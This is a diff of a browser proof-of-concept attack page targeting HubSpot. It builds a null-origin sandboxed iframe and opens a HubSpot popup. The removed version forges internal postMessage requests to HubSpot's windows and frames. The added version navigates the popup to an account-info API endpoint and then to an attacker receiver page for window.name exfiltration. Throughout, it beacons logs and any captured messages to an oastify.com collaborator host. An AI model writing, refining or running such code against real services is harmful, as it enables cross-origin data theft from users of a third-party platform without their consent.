@@ -19,7 +19,7 @@ window.addEventListener('message', function(e) {
         const blob = new Blob([`
 <html>
 <body>
-<h2>Null Origin Sandbox</h2>
+<h2>Popup Exploitation</h2>
 <div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
 <script>
 const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
@@ -31,95 +31,71 @@ function l(m) {
     new Image().src = E + '/?s=' + encodeURIComponent(m); 
 }
 
-l('START');
-l('origin=' + window.origin);
+l('START_origin=' + window.origin);
 
-// Listen for ALL messages (including from HubSpot)
-window.addEventListener('message', function(r) {
-    l('!!!MESSAGE_RECEIVED!!!');
-    l('from=' + r.origin);
-    l('type=' + (r.data.type || typeof r.data));
-    new Image().src = E + '/?MSG=' + encodeURIComponent(JSON.stringify(r.data).substring(0, 500));
-});
+// Open HubSpot
+l('opening_hubspot');
+let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
 
-l('opening_hub');
-
-let h = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
-
-if (!h) {
-    l('blocked');
+if (!hub) {
+    l('ERROR_blocked');
 } else {
-    l('opened');
+    l('popup_opened');
     
     let attempts = 0;
     let checker = setInterval(() => {
         attempts++;
         
         try {
-            h.origin;
-            if (attempts % 20 === 0) l('wait_' + attempts);
+            // Try to access - will throw when cross-origin
+            hub.origin;
+            if (attempts % 20 === 0) l('waiting_' + attempts);
         } catch(e) {
             clearInterval(checker);
-            l('loaded_' + attempts);
+            l('hubspot_loaded_after_' + attempts);
             
-            // Wait for HubSpot to initialize
+            // Now let's use the popup to navigate and exfiltrate data!
             setTimeout(() => {
-                l('SENDING_TO_TOP_WINDOW');
+                l('STARTING_DATA_EXTRACTION');
                 
-                // Send to main window
-                h.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                    commandId: 'test123',
-                    featureId: 'email_editor',
-                    parameters: {},
-                    resultCount: 1,
-                    language: 'en',
-                    objectId: '46962361',
-                    applicationId: 'email',
-                    basePath: '/',
-                    maxPollingAttempts: 5,
-                    pollingInterval: 1000
-                }, '*');
+                // Method 1: Navigate to a data API endpoint
+                l('navigating_to_api');
+                hub.location = 'https://api.hubapi.com/account-info/v3/details';
                 
-                l('sent_to_top');
+                // The response will be displayed in the popup
+                // We can't read it, but we can detect if it loaded
                 
-                // Try sending to frames (HubSpot has multiple iframes)
                 setTimeout(() => {
-                    l('SENDING_TO_FRAMES');
+                    l('checking_if_api_loaded');
                     
                     try {
-                        // Try to send to frames[0], frames[1], etc.
-                        for(let i = 0; i < 10; i++) {
+                        // If we can access hub.location.href, it's same-origin (our origin)
+                        let loc = hub.location.href;
+                        l('STILL_ACCESSIBLE_url=' + loc.substring(0, 100));
+                    } catch(err) {
+                        l('cross_origin_so_page_changed');
+                        
+                        // Method 2: Navigate to our exfil server with window.name
+                        setTimeout(() => {
+                            l('setting_window_name');
+                            
+                            // Try to set window.name before navigating
                             try {
-                                if (h.frames[i]) {
-                                    h.frames[i].postMessage({
-                                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                                        commandId: 'test' + i,
-                                        featureId: 'test',
-                                        parameters: {},
-                                        resultCount: 1,
-                                        language: 'en',
-                                        objectId: '46962361',
-                                        applicationId: 'test',
-                                        basePath: '/',
-                                        maxPollingAttempts: 1,
-                                        pollingInterval: 100
-                                    }, '*');
-                                    l('sent_to_frame_' + i);
-                                }
-                            } catch(err) {
-                                l('frame_' + i + '_error');
+                                hub.name = 'hubspot_data_' + Date.now();
+                                l('name_set=' + hub.name);
+                            } catch(e) {
+                                l('name_error');
                             }
-                        }
-                    } catch(e) {
-                        l('frames_error=' + e.message);
+                            
+                            // Navigate to our domain to read window.name
+                            l('navigating_to_exfil_server');
+                            hub.location = E + '/receiver.html';
+                            
+                        }, 2000);
                     }
-                    
-                    l('DONE_SENDING');
-                    
-                }, 1000);
+                }, 3000);
                 
-            }, 3000);
+            }, 2000);
         }
         
         if (attempts > 150) {
@@ -136,7 +112,7 @@ if (!h) {
         const blobUrl = URL.createObjectURL(blob);
         
         const iframe = document.createElement('iframe');
-        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
+        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation';
         iframe.src = blobUrl;
         iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
         
@@ -151,34 +127,3 @@ if(window.opener) {
 </script>
 </body>
 </html>
-```
-
----
-
-### **What This Does:**
-
-1. ✅ Creates null origin sandbox (working)
-2. ✅ Opens HubSpot popup
-3. ✅ Sends message to **top window**
-4. ✅ **Also tries sending to all iframes** (frames[0] through frames[9])
-5. ✅ **Listens for ANY message** from HubSpot (to see if we get responses)
-
----
-
-### **Expected Logs:**
-```
-/?s=START
-/?s=origin=null
-/?s=opening_hub
-/?s=opened
-/?s=loaded_XX
-/?s=SENDING_TO_TOP_WINDOW
-/?s=sent_to_top
-/?s=SENDING_TO_FRAMES
-/?s=sent_to_frame_0
-/?s=sent_to_frame_1
-/?s=sent_to_frame_2
-...
-/?s=DONE_SENDING
-/?MSG=...                ← ANY response from HubSpot
-/?s=!!!MESSAGE_RECEIVED!!!
